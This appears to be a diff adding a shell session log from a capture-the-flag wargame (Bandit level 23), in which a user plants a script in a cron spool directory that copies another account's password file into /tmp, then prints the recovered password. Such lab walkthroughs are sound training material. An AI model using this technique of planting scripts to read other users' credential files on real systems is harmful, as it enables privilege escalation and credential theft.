@@ -1,0 +1,22 @@
+
+bandit23@bandit:~$ cd /tmp/tmp.0O6VLeIOEc
+bandit23@bandit:/tmp/tmp.0O6VLeIOEc$ ls
+file.sh
+bandit23@bandit:/tmp/tmp.0O6VLeIOEc$ echo '#!/bin/bash' > getpass.sh
+echo 'cat /etc/bandit_pass/bandit24 > /tmp/passwordofsky.txt' >> getpass.sh
+bandit23@bandit:/tmp/tmp.0O6VLeIOEc$ cp getpass.sh /var/spool/bandit24/foo
+bandit23@bandit:/tmp/tmp.0O6VLeIOEc$ chmod 777 getpass.sh\
+> 
+bandit23@bandit:/tmp/tmp.0O6VLeIOEc$ chmod 777 getpass.sh
+bandit23@bandit:/tmp/tmp.0O6VLeIOEc$ cp getpass.sh /var/spool/bandit24/foo
+bandit23@bandit:/tmp/tmp.0O6VLeIOEc$ cat /tmp/passwordofsky.txt
+cat: /tmp/passwordofsky.txt: No such file or directory
+bandit23@bandit:/tmp/tmp.0O6VLeIOEc$ cp getpass.sh /var/spool/bandit24/foo
+bandit23@bandit:/tmp/tmp.0O6VLeIOEc$ cp getpass.sh /var/spool/bandit24/foo
+bandit23@bandit:/tmp/tmp.0O6VLeIOEc$ cat /tmp/passwordofsky.txt
+cat: /tmp/passwordofsky.txt: No such file or directory
+bandit23@bandit:/tmp/tmp.0O6VLeIOEc$ cat /tmp/passwordofsky.txt
+cat: /tmp/passwordofsky.txt: No such file or directory
+bandit23@bandit:/tmp/tmp.0O6VLeIOEc$ cat /tmp/passwordofsky.txt
+gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8
+bandit23@bandit:/tmp/tmp.0O6VLeIOEc$ 
